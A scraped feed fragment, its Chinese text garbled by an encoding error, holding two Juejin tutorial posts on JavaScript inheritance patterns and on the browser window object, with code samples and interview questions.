.hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">å‰è¨€</h3>
<p>JavaScript çš„ç»§æ‰¿ä¸åƒç±»ç±»å‹è¯­è¨€ï¼ˆå¦‚ Javaï¼‰é‚£æ ·ç›´è§‚ã€‚å®ƒæ˜¯é€šè¿‡åŸå‹é“¾æœºåˆ¶å®ç°çš„ã€‚ç†è§£å„ç§ç»§æ‰¿æ–¹å¼çš„æ¼”è¿›è¿‡ç¨‹ï¼Œä¸ä»…èƒ½å¸®ä½ åº”å¯¹é¢è¯•ï¼Œæ›´èƒ½è®©ä½ æ·±å…¥ç†è§£ JS çš„åº•å±‚è®¾è®¡ã€‚</p>
<h2 data-id="heading-1">ä¸€ã€ åŸå‹é“¾ç»§æ‰¿ï¼ˆPrototype Chain Inheritanceï¼‰</h2>
<p>è¿™æ˜¯æœ€åŸºæœ¬çš„ç»§æ‰¿æ–¹å¼ã€‚</p>
<ul>
<li><strong>å®ç°</strong>ï¼š<code>Child.prototype = new Father();</code></li>
</ul>
<h3 data-id="heading-2">ä¼˜ç‚¹</h3>
<ul>
<li>çˆ¶ç±»æ„é€ å‡½æ•°å†…éƒ¨çš„å±æ€§ã€æ–¹æ³•ä»¥åŠçˆ¶ç±»åŸå‹ä¸Šçš„æ–¹æ³•ï¼Œå­ç±»éƒ½èƒ½è®¿é—®ã€‚</li>
</ul>
<h3 data-id="heading-3">ç¼ºç‚¹ï¼ˆè‡´å‘½ä¼¤ï¼‰</h3>
<ol>
<li><strong>å¼•ç”¨å±æ€§å…±äº«</strong>ï¼šçˆ¶ç±»ä¸­å¦‚æœæœ‰å¼•ç”¨ç±»å‹å±æ€§ï¼ˆå¦‚ <code>Array</code>ï¼‰ï¼Œä¸€ä¸ªå­ç±»ä¿®æ”¹äº†å®ƒï¼Œæ‰€æœ‰å­ç±»éƒ½ä¼šè·Ÿç€å˜ã€‚</li>
<li><strong>æ— æ³•ä¼ å‚</strong>ï¼šåˆ›å»ºå­ç±»å®ä¾‹æ—¶ï¼Œæ— æ³•å‘çˆ¶ç±»æ„é€ å‡½æ•°ä¼ é€’å‚æ•°ã€‚</li>
</ol>
<hr/>
<h2 data-id="heading-4">äºŒã€ å€Ÿç”¨æ„é€ å‡½æ•°ç»§æ‰¿ï¼ˆConstructor Stealingï¼‰</h2>
<p>ä¸ºäº†è§£å†³ä¼ å‚å’Œå¼•ç”¨å…±äº«é—®é¢˜ï¼Œå‡ºç°äº†è¿™ç§æ–¹å¼ã€‚</p>
<ul>
<li><strong>å®ç°</strong>ï¼šåœ¨å­ç±»æ„é€ å‡½æ•°ä¸­ä½¿ç”¨ <code>Father.call(this, ...args)</code>ã€‚</li>
</ul>
<h3 data-id="heading-5">ä¼˜ç‚¹</h3>
<ol>
<li><strong>ç‹¬ç«‹æ€§</strong>ï¼šæ¯ä¸ªå­ç±»å®ä¾‹éƒ½æœ‰è‡ªå·±çš„å±æ€§å‰¯æœ¬ï¼Œäº’ä¸å¹²æ‰°ã€‚</li>
<li><strong>å¯ä¼ å‚</strong>ï¼šå¯ä»¥å‘çˆ¶ç±»æ„é€ å‡½æ•°ä¼ é€’å‚æ•°ã€‚</li>
</ol>
<h3 data-id="heading-6">ç¼ºç‚¹</h3>
<ul>
<li><strong>æ–¹æ³•æ— æ³•å¤ç”¨</strong>ï¼šåªèƒ½ç»§æ‰¿çˆ¶ç±»æ„é€ å‡½æ•°å†…çš„å±æ€§ï¼Œ<strong>æ— æ³•ç»§æ‰¿çˆ¶ç±»åŸå‹ï¼ˆprototypeï¼‰ä¸Šçš„æ–¹æ³•</strong>ã€‚</li>
</ul>
<hr/>
<h2 data-id="heading-7">ä¸‰ã€ ç»„åˆç»§æ‰¿ï¼ˆCombination Inheritanceï¼‰â­</h2>
<p>è¿™æ˜¯æœ€å¸¸ç”¨çš„ç»§æ‰¿æ–¹å¼ï¼Œå®ƒç»“åˆäº†å‰ä¸¤è€…çš„ä¼˜ç‚¹ã€‚</p>
<ul>
<li><strong>æ ¸å¿ƒæ€æƒ³</strong>ï¼šå…ˆå°†å­ç±»æ„é€ å‡½æ•°çš„protypeæŒ‡å‘ä¸ºçˆ¶ç±»æ„é€ å‡½æ•°çš„ä¸€ä¸ªå®ä¾‹ï¼Œå¤§è‡´æ­¥éª¤å’ŒåŸå‹é“¾ç»§æ‰¿ä¸€æ ·ï¼Œåªæ˜¯å¤šäº†åœ¨å­ç±»æ„é€ å‡½æ•°é‡Œé¢è°ƒç”¨çˆ¶ç±»æ„é€ å‡½æ•°çš„è¿‡ç¨‹ï¼Œå¯æ€»ç»“ä¸ºç”¨æ„é€ å‡½æ•°ç»§æ‰¿å±æ€§ï¼Œç”¨åŸå‹é“¾ç»§æ‰¿æ–¹æ³•ã€‚</li>
<li><strong>æ·±åº¦åˆ†æ</strong>ï¼šç»„åˆç»§æ‰¿å­ç±»çš„å®ä¾‹å±æ€§å®šä¹‰åœ¨æ„é€ å‡½æ•°ä¸­ï¼Œè€Œæ–¹æ³•åˆ™å®šä¹‰åœ¨æ„é€ å‡½æ•°çš„æ–°åŸå‹ä¸­ï¼ŒåŒæ—¶å°†æ–°åŸå‹çš„constructoræŒ‡å‘æ„é€ å‡½æ•°ï¼ˆä¸ºä»€ä¹ˆéœ€è¦å°†constructæŒ‡å‘æ„é€ å‡½æ•°ï¼Œå› ä¸ºå¦‚æœä¸æŒ‡å‘æ„é€ å‡½æ•°çš„è¯ï¼Œé€šè¿‡newç±»æ„é€ å‡½æ•° æ„é€ å‡ºæ¥è¿™ä¸ªå®ä¾‹å¯¹è±¡æ˜¯æ²¡æœ‰constructorå±æ€§çš„ï¼Œæˆ‘ä»¬è¦æ‰¾å­ç±»constructoræ—¶ï¼Œä¼šé€šè¿‡åŸå‹é“¾ç›´æ¥æ‰¾åˆ°çˆ¶ç±»çš„constructorå±æ€§ï¼Œè€Œçˆ¶ç±»çš„constructorå±æ€§æ˜¯æŒ‡å‘çˆ¶ç±»æ„é€ å‡½æ•°çš„ï¼‰</li>
<li><strong>åŸç†å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</strong></li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ab96008be56b4309815e354eac9b98c7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-R546w5LiA5Y-q5aSn5ZGG55Oc:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769436036&amp;x-signature=5%2B85PtrIQ8VDWUefxtvukhq8YEQ%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-8">ä»£ç å®æˆ˜</h3>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Father</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">nums</span> = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>];
}
<span class="hljs-title class_">Father</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sayName</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">Child</span>(<span class="hljs-params">name, age</span>) {
    <span class="hljs-comment">// 1. ç»§æ‰¿å±æ€§ï¼ˆæ„é€ å‡½æ•°ç»§æ‰¿ï¼‰</span>
    <span class="hljs-title class_">Father</span>.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>, name); 
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;
}

<span class="hljs-comment">// 2. ç»§æ‰¿æ–¹æ³•ï¼ˆåŸå‹é“¾ç»§æ‰¿ï¼‰</span>
<span class="hljs-title class_">Child</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Father</span>();
<span class="hljs-comment">// 3. ä¿®å¤ constructor æŒ‡å‘</span>
<span class="hljs-title class_">Child</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> = <span class="hljs-title class_">Child</span>; 

<span class="hljs-title class_">Child</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sayAge</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span>);
}

<span class="hljs-keyword">const</span> child1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Child</span>(<span class="hljs-string">'ouyang'</span>, <span class="hljs-number">16</span>);
child1.<span class="hljs-property">nums</span>.<span class="hljs-title function_">push</span>(<span class="hljs-number">5</span>); 
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(child1.<span class="hljs-property">nums</span>); <span class="hljs-comment">// [1, 2, 3, 4, 5]</span>

<span class="hljs-keyword">const</span> child2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Child</span>(<span class="hljs-string">'hudie'</span>, <span class="hljs-number">18</span>); 
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(child2.<span class="hljs-property">nums</span>); <span class="hljs-comment">// [1, 2, 3, 4] (äº’ä¸å½±å“ï¼)</span>
</code></pre>
<hr/>
<h2 data-id="heading-9">äº”ã€ é¢è¯•æ¨¡æ‹Ÿé¢˜</h2>
<h3 data-id="heading-10">Q1ï¼šä¸ºä»€ä¹ˆ JavaScript çš„ç»§æ‰¿è¦è®¾è®¡åŸå‹é“¾ï¼Ÿ</h3>
<p><strong>å‚è€ƒå›ç­”ï¼š</strong> åŸå‹é“¾å®ç°äº†<strong>å±æ€§å’Œæ–¹æ³•çš„å…±äº«</strong>ã€‚å¦‚æœä¸ä½¿ç”¨åŸå‹é“¾ï¼Œæ¯ä¸ªå®ä¾‹éƒ½è¦å•ç‹¬å­˜å‚¨ä¸€ä»½æ–¹æ³•ï¼Œä¼šé€ æˆæå¤§çš„å†…å­˜æµªè´¹ã€‚åŸå‹é“¾å…è®¸æ‰€æœ‰å®ä¾‹å…±äº«åŒä¸€å¥—æ–¹æ³•ï¼ˆå­˜å‚¨åœ¨ <code>prototype</code> ä¸­ï¼‰ï¼ŒåŒæ—¶é€šè¿‡æ„é€ å‡½æ•°ä¿è¯æ¯ä¸ªå®ä¾‹æœ‰ç‹¬ç«‹çš„å±æ€§ã€‚</p>
<h3 data-id="heading-11">Q2ï¼š<code>new Father()</code> å’Œ <code>Object.create(Father.prototype)</code> åœ¨ç»§æ‰¿æ—¶æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</h3>
<p><strong>å‚è€ƒå›ç­”ï¼š</strong></p>
<ol>
<li><code>new Father()</code> ä¼šæ‰§è¡Œ <code>Father</code> æ„é€ å‡½æ•°å†…éƒ¨çš„ä»£ç ï¼Œå¹¶å°†å±æ€§æŒ‚è½½åˆ°åŸå‹ä¸Šã€‚</li>
<li><code>Object.create(Father.prototype)</code> åˆ›å»ºä¸€ä¸ªæ–°å¯¹è±¡ï¼Œå…¶åŸå‹æŒ‡å‘ <code>Father.prototype</code>ï¼Œä½†<strong>ä¸ä¼šæ‰§è¡Œ Father çš„æ„é€ å‡½æ•°</strong>ã€‚è¿™é¿å…äº†å­ç±»åŸå‹ä¸Šå‡ºç°ä¸å¿…è¦çš„çˆ¶ç±»å®ä¾‹å±æ€§ï¼Œæ€§èƒ½æ›´ä¼˜ã€‚</li>
</ol>
<h3 data-id="heading-12">Q3ï¼šES6 çš„ <code>extends</code> ç»§æ‰¿å’Œç»„åˆç»§æ‰¿æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</h3>
<p><strong>å‚è€ƒå›ç­”ï¼š</strong></p>
<ol>
<li><strong>åº•å±‚æœºåˆ¶</strong>ï¼šES5 ç»§æ‰¿æ˜¯å…ˆåˆ›å»ºå­ç±»å®ä¾‹ <code>this</code>ï¼Œå†å°†çˆ¶ç±»å±æ€§æ·»åŠ åˆ° <code>this</code> ä¸Šï¼›ES6 ç»§æ‰¿æ˜¯å…ˆåˆ›å»ºçˆ¶ç±»å®ä¾‹ <code>this</code>ï¼ˆé€šè¿‡ <code>super()</code>ï¼‰ï¼Œå†ç”¨å­ç±»æ„é€ å‡½æ•°ä¿®æ”¹ <code>this</code>ã€‚</li>
<li><strong>é™æ€æ–¹æ³•ç»§æ‰¿</strong>ï¼šES6 çš„ <code>extends</code> å¯ä»¥ç»§æ‰¿çˆ¶ç±»çš„é™æ€æ–¹æ³•ï¼ˆ<code>static</code>ï¼‰ï¼Œè€Œ ES5 çš„ç»„åˆç»§æ‰¿éœ€è¦æ‰‹åŠ¨å¤„ç†æ‰èƒ½å®ç°ã€‚</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[JS-BOMæ ¸å¿ƒwindowå¯¹è±¡]]></title>    <link>https://juejin.cn/post/7596896373053767743</link>    <guid>https://juejin.cn/post/7596896373053767743</guid>    <pubDate>2026-01-19T14:10:53.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596896373053767743" data-draft-id="7596865421612548150" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="JS-BOMæ ¸å¿ƒwindowå¯¹è±¡"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript"/> <meta itemprop="datePublished" content="2026-01-19T14:10:53.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å‘ç°ä¸€åªå¤§å‘†ç“œ"/> <meta itemprop="url" content="https://juejin.cn/user/180747382561607"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            JS-BOMæ ¸å¿ƒwindowå¯¹è±¡
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/180747382561607/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å‘ç°ä¸€åªå¤§å‘†ç“œ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-19T14:10:53.000Z" title="Mon Jan 19 2026 14:10:53 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-19
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    7
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">å‰è¨€</h3>
<p>åœ¨æµè§ˆå™¨ç¯å¢ƒä¸­ï¼Œ<code>window</code> å¯¹è±¡æ‰®æ¼”ç€åŒé‡è§’è‰²ï¼šå®ƒæ—¢æ˜¯ JavaScript è®¿é—®æµè§ˆå™¨çª—å£çš„æ¥å£ï¼Œåˆæ˜¯ ECMAScript è§„å®šçš„ <strong>Global å¯¹è±¡</strong>ã€‚ç†è§£ <code>window</code> çš„å±æ€§ä¸æ–¹æ³•ï¼Œæ˜¯æŒæ¡æµè§ˆå™¨ç¯å¢ƒå¼€å‘çš„ç¬¬ä¸€æ­¥ã€‚</p>
<h2 data-id="heading-1">ä¸€ã€ Window å¯¹è±¡çš„åŒé‡èº«ä»½</h2>
<ol>
<li><strong>æµè§ˆå™¨çª—å£æ¥å£</strong>ï¼šæ§åˆ¶çª—å£å¤§å°ã€ä½ç½®ã€å¯¼èˆªç­‰ã€‚</li>
<li><strong>å…¨å±€ä½œç”¨åŸŸ</strong>ï¼šé€šè¿‡ <code>var</code> å£°æ˜çš„å˜é‡ã€å‡½æ•°éƒ½ä¼šå˜æˆ <code>window</code> çš„å±æ€§ï¼ˆæ³¨æ„ï¼š<code>let</code> å’Œ <code>const</code> ä¸ä¼šï¼‰ã€‚</li>
</ol>
<hr/>
<h2 data-id="heading-2">äºŒã€ çª—å£å±‚çº§ï¼šTop ä¸ Parent çš„å¥¥ç§˜</h2>
<p>åœ¨å¤„ç† <code>&lt;iframe&gt;</code> åµŒå¥—æˆ–å¤šçª—å£åœºæ™¯æ—¶ï¼Œç²¾ç¡®å®šä½çª—å£å±‚çº§è‡³å…³é‡è¦ã€‚</p>
<ul>
<li><strong><code>window.top</code></strong>ï¼šå§‹ç»ˆæŒ‡å‘æœ€å¤–å±‚çš„æµè§ˆå™¨çª—å£ï¼ˆå³æœ€é¡¶å±‚çš„æ¡†æ¶ï¼‰ã€‚</li>
<li><strong><code>window.parent</code></strong>ï¼šæŒ‡å‘å½“å‰çª—å£çš„ç›´æ¥ä¸Šå±‚çª—å£ã€‚å¦‚æœå½“å‰çª—å£æœ¬èº«å°±æ˜¯é¡¶å±‚ï¼Œåˆ™ <code>parent</code> ç­‰äº <code>self</code>ã€‚</li>
<li><strong><code>window.self</code></strong>ï¼šæŒ‡å‘å½“å‰çª—å£ï¼Œä¸ <code>window</code> ç­‰ä»·ã€‚</li>
</ul>
<blockquote>
<p><strong>åŒæºé™åˆ¶</strong>ï¼šåªæœ‰åœ¨åŒæºï¼ˆåè®®ã€åŸŸåã€ç«¯å£ä¸€è‡´ï¼‰çš„æƒ…å†µä¸‹ï¼Œæ‰èƒ½é€šè¿‡è¿™äº›å±æ€§è®¿é—®çˆ¶çª—å£çš„ DOM æˆ–å˜é‡ã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-3">ä¸‰ã€ çª—å£å°ºå¯¸ï¼šInner vs Outer</h2>
<p>å¾ˆå¤šå¼€å‘è€…åˆ†ä¸æ¸…è¿™ä¸¤ç»„å±æ€§çš„åŒºåˆ«ï¼Œçœ‹å›¾æœ€ç›´è§‚ï¼š</p>




















<table><thead><tr><th><strong>å±æ€§</strong></th><th><strong>åŒ…å«å†…å®¹</strong></th><th><strong>å¤‡æ³¨</strong></th></tr></thead><tbody><tr><td><strong><code>innerWidth / innerHeight</code></strong></td><td>ä»…é¡µé¢è§†å›¾åŒºåŸŸï¼ˆViewportï¼‰</td><td>ä¸å«å·¥å…·æ ã€è¾¹æ¡†ï¼Œ<strong>åŒ…å«</strong>æ»šåŠ¨æ¡</td></tr><tr><td><strong><code>outerWidth / outerHeight</code></strong></td><td>æ•´ä¸ªæµè§ˆå™¨çª—å£</td><td>åŒ…å«åœ°å€æ ã€æ ‡ç­¾æ ã€ä¾§è¾¹æ ã€çª—å£è¾¹æ¡†</td></tr></tbody></table>
<blockquote>
<p><strong>æç¤º</strong>ï¼šç”±äºä¸åŒæµè§ˆå™¨çš„ UI ç»„ä»¶ï¼ˆå¦‚ä¾§è¾¹æ ã€æ”¶è—å¤¹ï¼‰å ç”¨ç©ºé—´ä¸åŒï¼Œ<code>outer</code> ç³»åˆ—çš„å€¼åœ¨å„å¹³å°å·®å¼‚è¾ƒå¤§ã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-4">å››ã€ çª—å£å¯¼èˆªä¸å¼¹çª—æ§åˆ¶ï¼šwindow.open</h2>
<p><code>window.open(url, name, features, replace)</code> æ˜¯æ§åˆ¶é¡µé¢è·³è½¬çš„åˆ©å™¨ã€‚</p>
<h3 data-id="heading-5">1. å‚æ•°ç»†èŠ‚</h3>
<ul>
<li><strong><code>name</code></strong>ï¼šè¿™æ˜¯ä¸€ä¸ªéšè—çš„â€œé»‘ç§‘æŠ€â€ã€‚è‹¥å·²å­˜åœ¨åŒåçª—å£ï¼Œæµè§ˆå™¨ä¼šåœ¨è¯¥çª—å£åŠ è½½ URLï¼Œè€Œä¸æ˜¯æ–°å»ºæ ‡ç­¾é¡µã€‚è¿™å¸¸ç”¨äºå•é¡µé¢åº”ç”¨ä¸­çš„è·¨çª—å£é€šä¿¡ã€‚</li>
<li><strong><code>features</code></strong>ï¼šå­—ç¬¦ä¸²æ ¼å¼ï¼Œå¦‚ <code>"width=400,height=300,top=100,left=100"</code>ã€‚</li>
<li><strong><code>replace</code></strong>ï¼šå¸ƒå°”å€¼ã€‚å¦‚æœä¸º <code>true</code>ï¼Œæ–°é¡µé¢å°†æ›¿æ¢å½“å‰é¡µåœ¨å†å²è®°å½•ï¼ˆHistoryï¼‰ä¸­çš„ä½ç½®ï¼Œç”¨æˆ·ç‚¹å‡»â€œåé€€â€æ— æ³•å›åˆ°åŸé¡µé¢ã€‚</li>
</ul>
<h3 data-id="heading-6">2. å®‰å…¨æ€§ä¸æ‹¦æˆªå¤„ç†</h3>
<p>ç”±äºå¹¿å‘Šå¼¹çª—æ»¥ç”¨ï¼Œç°ä»£æµè§ˆå™¨å¯¹ <code>window.open</code> æœ‰ä¸¥æ ¼é™åˆ¶ï¼š<strong>åªæœ‰ç”±ç”¨æˆ·æ“ä½œï¼ˆå¦‚ç‚¹å‡»äº‹ä»¶ï¼‰è§¦å‘çš„å¼¹çª—æ‰ä¼šè¢«å…è®¸ã€‚</strong></p>
<p><strong>æœ€ä½³å®è·µæ£€æµ‹ä»£ç ï¼š</strong></p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-comment">// å°è¯•æ‰“å¼€æ–°çª—å£</span>
<span class="hljs-keyword">let</span> popup = <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">open</span>(<span class="hljs-string">'https://juejin.cn'</span>, <span class="hljs-string">'_blank'</span>);

<span class="hljs-comment">// æ£€æµ‹æ˜¯å¦è¢«æ‹¦æˆªï¼ˆæŸäº›æ’ä»¶ä¼šå¯¼è‡´ popup ä¸º nullï¼ŒæŸäº›æµè§ˆå™¨ä¼šæŠ›å‡ºå¼‚å¸¸ï¼‰</span>
<span class="hljs-keyword">try</span> {
  <span class="hljs-keyword">if</span> (popup == <span class="hljs-literal">null</span> || popup.<span class="hljs-property">closed</span> || <span class="hljs-keyword">typeof</span> popup.<span class="hljs-property">closed</span> === <span class="hljs-string">'undefined'</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">warn</span>(<span class="hljs-string">'å¼¹çª—è¢«æµè§ˆå™¨æ‹¦æˆªï¼Œè¯·å¼•å¯¼ç”¨æˆ·æ‰‹åŠ¨å¼€å¯æƒé™ï¼'</span>);
  }
} <span class="hljs-keyword">catch</span> (e) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'å¼¹çª—è¢«æ‹¦æˆªæˆ–å‘ç”Ÿè·¨åŸŸé”™è¯¯'</span>);
}
</code></pre>
<hr/>
<h2 data-id="heading-7">å…­ã€ é¢è¯•æ¨¡æ‹Ÿé¢˜</h2>
<h3 data-id="heading-8">Q1ï¼š<code>window.onload</code> å’Œ <code>DOMContentLoaded</code> æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</h3>
<p><strong>å‚è€ƒå›ç­”ï¼š</strong></p>
<ul>
<li><code>DOMContentLoaded</code>ï¼šå½“ HTML æ–‡æ¡£è¢«å®Œå…¨åŠ è½½å’Œè§£æå®Œæˆæ—¶è§¦å‘ï¼Œ<strong>ä¸éœ€è¦ç­‰å¾…</strong>æ ·å¼è¡¨ã€å›¾åƒå’Œå­æ¡†æ¶çš„å®ŒæˆåŠ è½½ã€‚</li>
